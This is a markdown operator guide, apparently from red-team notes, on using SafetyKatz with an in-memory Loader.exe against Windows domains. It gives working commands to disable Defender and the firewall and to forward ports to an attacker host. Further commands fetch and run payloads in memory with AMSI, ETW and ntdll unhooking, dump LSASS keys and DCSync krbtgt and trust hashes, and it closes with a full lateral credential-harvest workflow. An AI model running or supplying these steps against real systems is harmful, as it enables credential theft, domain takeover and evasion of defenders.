# SafetyKatz + Loader.exe

**SafetyKatz** is a .NET port of Mimikatz that extracts only what it needs from a minidump of LSASS, making it significantly harder to detect than running Mimikatz directly.

**Loader.exe** executes binaries entirely in memory by fetching them over HTTP - the payload never touches disk.

Repos: `GhostPack/SafetyKatz`, `Flangvik/NetLoader` (or equivalents like `TheWover/donut` for shellcoded variants).

---

## Why SafetyKatz + Loader Instead of Mimikatz

| | Mimikatz | SafetyKatz via Loader |
|---|---|---|
| Touches disk | Yes - .exe written to disk | No - loaded entirely in memory |
| AV signature surface | Very high (universal sigs) | Lower - obfuscated .NET + in-memory only |
| AMSI surface | High | Reduced - Loader unhooks AMSI before execution |
| DLL unhooking | No | Yes - Loader patches ntdll hooks on load |
| Syntax | Native Mimikatz | Pass Mimikatz args via `-args` |

SafetyKatz does not implement every Mimikatz module. It covers `sekurlsa::*`, `lsadump::dcsync`, and `lsadump::trust`. For everything else (Golden Ticket, Silver Ticket, PTH), use [Rubeus](rubeus.md) or run Mimikatz itself through Loader.

---

## Privileges Required

Same as Mimikatz - SafetyKatz is a wrapper, not an escalation tool:

| Command | Privilege needed |
|---|---|
| `sekurlsa::evasive-keys` / `sekurlsa::logonPasswords` | SYSTEM + SeDebugPrivilege (local admin minimum) |
| `lsadump::dcsync` | Domain account with DCSync rights - does NOT need local admin |
| `lsadump::trust` | SYSTEM on a DC |

Blockers:
- **LSA Protection (RunAsPPL)** - blocks LSASS reads even from SYSTEM. SafetyKatz will fail silently or return empty output.
- **Credential Guard** - hashes return as zeros even when LSASS reads succeed.
- **EDR on process creation** - Loader's in-memory execution reduces but does not eliminate detection risk.

Always try to disable Defender realtime scanning first if you have the rights: `Set-MpPreference -DisableRealtimeMonitoring $true`.

---

## Loader.exe - How It Works

Loader fetches a binary over HTTP, maps it into memory, unhooks user-mode AV/EDR hooks in ntdll, bypasses AMSI, and executes it - all without writing to disk.

```
Loader.exe -path <URL or local path> [-args "<arg1>" "<arg2>" ...]
```

| Flag | What it takes | Notes |
|---|---|---|
| `-path` | URL or local path to the binary | HTTP/HTTPS URL or `C:\path\to\file.exe` |
| `-args` | Space-separated quoted arguments | Passed directly to the loaded binary as its command line |

Typical setup:
1. Host files on an HTTP File Server (HFS, python `http.server`, etc.) on your attacker box.
2. Disable Windows Firewall on the target if needed: `netsh advfirewall set allprofiles state off`.
3. Set up port forwarding back to your attacker box if the target can't reach it directly:
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<ATTACKER-IP>
```
4. Call Loader from the target session pointing at your HFS:
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "<mimikatz command>" "exit"
```

Always end `-args` with `"exit"` - without it SafetyKatz hangs waiting for interactive input.

---

## Core SafetyKatz Commands via Loader

### Dump LSASS - AES Keys (Preferred)

Quieter than `logonPasswords`. Returns AES256 and RC4 keys for all logged-in sessions - exactly what Rubeus wants.

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

What to grab from output:

```
* Username : svc_backup
* Domain   : CORP
* aes256_hmac  : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   <- Rubeus /aes256:
* rc4_hmac_nt  : bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb                                   <- Rubeus /rc4: or PTH
```

### Dump LSASS - All Credentials

Returns NTLM hashes + cleartext passwords (if WDigest is enabled) for all logged-in sessions.

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::logonPasswords" "exit"
```

Noisier than `evasive-keys`. Use when you specifically need NTLM hashes or are looking for cleartext.

### Machine Account Keys (for RBCD)

When you need the AES keys of the machine account itself (for example to run an RBCD S4U chain as the workstation account):

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

Look for the entry whose `Username` ends in `$` - that's the machine account:

```
* Username : WKSTN01$
* Domain   : CORP
* aes256_hmac  : cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc   <- Rubeus asktgt for S4U
```

### DCSync - Pull krbtgt Hash

Replicates from the DC to pull credential material. Run from any session with DA rights - does not need to be on the DC.

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::dcsync /user:CORP\krbtgt /domain:corp.local" "exit"
```

What to grab:

```
** SAM ACCOUNT **
SAM Username : krbtgt
Object Security ID : S-1-5-21-1111111111-2222222222-3333333333-502

Credentials:
  Hash NTLM: dddddddddddddddddddddddddddddddd       <- /krbtgt: for Golden Ticket
  AES256 HMAC: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee     <- /aes256: for Golden Ticket (preferred)
```

Domain SID = the object SID minus the trailing RID (`-502` in this case):
`S-1-5-21-1111111111-2222222222-3333333333-502` -> Domain SID = `S-1-5-21-1111111111-2222222222-3333333333`.

### DCSync - Specific User Hash

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::dcsync /user:CORP\Administrator /domain:corp.local" "exit"
```

### DCSync - Trust Keys (Cross-Domain)

When you have DA on `corp.local` and need to move to a trusted domain (e.g. `partner.local`):

```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::trust /patch" "exit"
```

Output:

```
Domain: PARTNER.LOCAL
[ In ] CORP.LOCAL -> PARTNER.LOCAL
  * aes256_hmac  : ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff   <- inter-realm key
  * rc4_hmac_nt  : 11111111111111111111111111111111
```

Use the `[ In ]` entry's AES key with Rubeus `silver` to forge the inter-realm referral ticket. If the trust has `FILTER_SIDS` set, do NOT use `/sids:` when forging the referral ticket - the foreign DC strips extra SIDs and the ticket fails.

---

## Running SafetyKatz Without Loader (Local Path)

If you already have SafetyKatz on disk (for example in an AV-excluded directory):

```
C:\tools\SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
C:\tools\SafetyKatz.exe "lsadump::dcsync /user:CORP\krbtgt /domain:corp.local" "exit"
```

---

## Running Full Mimikatz Through Loader

For commands SafetyKatz does not support (`kerberos::golden`, `sekurlsa::pth`, `misc::skeleton`, etc.), load Mimikatz itself through Loader:

```
Loader.exe -path http://127.0.0.1:8080/Mimikatz.exe -args "privilege::debug" "sekurlsa::logonPasswords" "exit"
```

---

## Full Workflow - Lateral Credential Harvest

```powershell
# 1. On the attacker box: host Loader + SafetyKatz over HTTP on port 80

# 2. Copy Loader to the target
xcopy \\attacker\share\Loader.exe \\TARGET\C$\Users\Public\Loader.exe /Y

# 3. Get a shell on the target
winrs -r:target.corp.local cmd

# 4. On target: forward local 8080 back to the attacker's HTTP server
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<ATTACKER-IP>

# 5. Run SafetyKatz through Loader over the loopback forward
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

# 6. Note all aes256_hmac / rc4_hmac_nt values - look for DA and service-account sessions
```

---

## What SafetyKatz Cannot Do

For these, use the tools listed:

| Capability | Use instead |
|---|---|
| Golden Ticket | Rubeus `golden` |
| Silver Ticket | Rubeus `silver` |
| Diamond Ticket | Rubeus `diamond` |
| Pass the Hash (spawn process) | Rubeus `asktgt` + `/ptt`, or Mimikatz `sekurlsa::pth` through Loader |
| Pass the Ticket | Rubeus `ptt` |
| S4U / RBCD | Rubeus `s4u` |
| Skeleton Key | Mimikatz `misc::skeleton` through Loader (needs SYSTEM on DC) |
| Kerberoasting | Rubeus `kerberoast` |

---

## Loader Output - What the Unhook Messages Mean

Successful run:

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[*] Module is not loaded, Skipping...
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments : sekurlsa::evasive-keys exit
```

`Module is not loaded, Skipping...` on optional modules is normal. If you see it for the main binary the URL is wrong or the HTTP server is not reachable - double-check port forwarding.

---

## Related

- [Mimikatz](mimikatz.md) - full Mimikatz reference including Golden / Silver Ticket syntax
- [Rubeus](rubeus.md) - Kerberos ticket operations, S4U, RBCD, PTT
- [BloodHound](bloodhound.md) - finding accounts with DCSync rights
- [ADCS Attacks](../active-directory/post-compromise/adcs/README.md) - certificate-based paths to DA
